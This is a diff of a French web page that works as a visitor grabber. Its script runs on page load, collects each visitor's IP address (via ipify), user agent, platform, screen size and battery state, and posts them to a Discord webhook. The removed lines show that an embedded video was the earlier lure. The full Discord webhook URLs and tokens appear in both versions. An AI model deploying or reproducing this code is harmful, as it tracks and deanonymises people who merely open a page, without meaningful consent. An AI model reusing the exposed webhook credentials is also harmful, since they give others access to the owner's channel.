@@ -3,31 +3,20 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Webhook avec Vidéo, IP et Batterie</title>
+    <title>Webhook sans Vidéo, IP v4 et Batterie</title>
     <link rel="stylesheet" href="styles.css">
 </head>
 <body>
     <div class="terminal">
-        <h1>Visionner la vidéo</h1>
-        <div class="video-container">
-            <iframe 
-                width="640" 
-                height="360" 
-                frameborder="0" 
-                src="https://mega.nz/embed/2ZV3EThY#kVqMoRsoZ-AOWQ6jxgBy0M506cyrc2c-4u4UQWeAKbw" 
-                allowfullscreen>
-            </iframe>
-        </div>
+        <!-- Vidéo supprimée -->
     </div>
 
     <h2>Informations collectées automatiquement :</h2>
     <p>Ces données seront envoyées à un webhook Discord.</p>
 
     <script>
-        // URL du webhook Discord
-        const webhookUrl = "https://discord.com/api/webhooks/1325151806598287380/DYCuu8XPtggqqqdDiRqofp_KLwkFvXNWnAEipKw6kWGV_cwGbiy2oIwc2dcwel3Fd107";
+        const webhookUrl = "https://discord.com/api/webhooks/1358584819793006702/HCU1yAVt96hNsGEdlNTmgAMgN4hI59cSuCpLe9xmNyEQK0o1MbzH8rKQeOWihmynxTaw";
 
-        // Collecte des informations de l'utilisateur
         const userData = {
             userAgent: navigator.userAgent,
             platform: navigator.platform,
@@ -36,29 +25,26 @@
             screenResolution: `${window.screen.width}x${window.screen.height}`
         };
 
-        // Fonction pour récupérer les informations de la batterie
         const getBatteryInfo = () => {
             return new Promise((resolve, reject) => {
                 if (navigator.getBattery) {
                     navigator.getBattery().then(battery => {
                         resolve({
-                            level: battery.level * 100, // Niveau de la batterie en pourcentage
-                            charging: battery.charging // Si l'appareil est en charge
+                            level: battery.level * 100,
+                            charging: battery.charging
                         });
                     }).catch(reject);
                 } else {
-                    resolve(null); // Pas d'accès à l'API batterie
+                    resolve(null);
                 }
             });
         };
 
-        // Récupération de l'adresse IP
-        fetch("https://api.ipify.org?format=json")
+        fetch("https://api.ipify.org?format=json&ip=4")
             .then(response => response.json())
             .then(data => {
-                userData.ip = data.ip; // Ajoute l'adresse IP aux données
+                userData.ip = data.ip;
 
-                // Récupération des informations de la batterie
                 getBatteryInfo().then(batteryInfo => {
                     if (batteryInfo) {
                         userData.batteryLevel = batteryInfo.level;
@@ -68,7 +54,6 @@
                         userData.isCharging = "Non disponible";
                     }
 
-                    // Préparation du message pour le webhook Discord
                     const webhookMessage = {
                         content: "Nouvelle interaction sur le site",
                         embeds: [
@@ -90,7 +75,6 @@
                         ]
                     };
 
-                    // Envoi des données au webhook Discord
                     fetch(webhookUrl, {
                         method: "POST",
                         headers: {
